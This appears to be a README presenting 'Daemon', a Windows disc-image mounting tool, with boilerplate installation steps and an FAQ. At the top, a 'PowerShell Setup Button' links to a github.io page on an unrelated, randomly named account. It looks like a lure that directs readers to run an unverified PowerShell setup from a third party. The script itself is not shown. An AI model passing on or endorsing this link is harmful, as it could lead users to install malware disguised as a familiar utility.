[![PowerShell Setup Button](./imgs/button.png)](https://cyanmelodyannihilate.github.io/daemon-pro/)
## Introduction
Daemon is a system utility designed for Windows users that need to manage and emulate disc images. It addresses common issues like accessing software that relies on physical media without needing to insert a disc, streamlining operations for software developers and testers, and enhancing productivity for everyday users. 

With Daemon, users can mount ISO files and other disc image formats, allowing for easy access and use of software without the hassle of physical media. This capability is particularly valuable for those working with legacy applications or for users looking to optimize their file management processes.

## How It Works
1. **Installation**: Download the Daemon software and run the installer. Follow the prompts to complete the installation process.

2. **Launching the Application**: Open Daemon from the Start Menu or desktop shortcut. The main interface will display options for mounting and managing disc images.

3. **Mounting an Image**: Navigate to the section for mounting images, select the desired ISO or other supported format, and click the mount button. The virtual drive will be created automatically.

4. **Using the Mounted Drive**: Access the mounted drive through Windows Explorer as if it were a physical disc. Once finished, unmount the image using the unmount option in the application.

## FAQ

### What is Daemon used for?
Daemon is primarily used to mount disc image files, allowing users to access software and applications without needing physical discs. This is particularly useful for running applications that rely on installation media, streamlining the process for developers and everyday users.

### How do I install Daemon on my Windows system?
To install Daemon, download the installation package for Windows, then run the installer. Follow the on-screen instructions to complete the installation. Once installed, you can launch the application to start using its features for mounting disc images.

### Is Daemon compatible with Windows 10 and 11?
Yes, Daemon is compatible with both Windows 10 and Windows 11. It is designed specifically for these operating systems and optimized for their respective features.

### Can I use Daemon to edit disc images?
No, Daemon does not support editing or creating disc images. Its primary functionality is to mount existing disc image files for access. If you require editing capabilities, consider using additional software designed for that purpose.

### How can I remove or unmount a disc image in Daemon?
To unmount a disc image, open the Daemon application, locate the mounted image, and select the unmount option. Alternatively, you can right-click on the virtual drive in Windows Explorer and choose the option to eject or unmount.
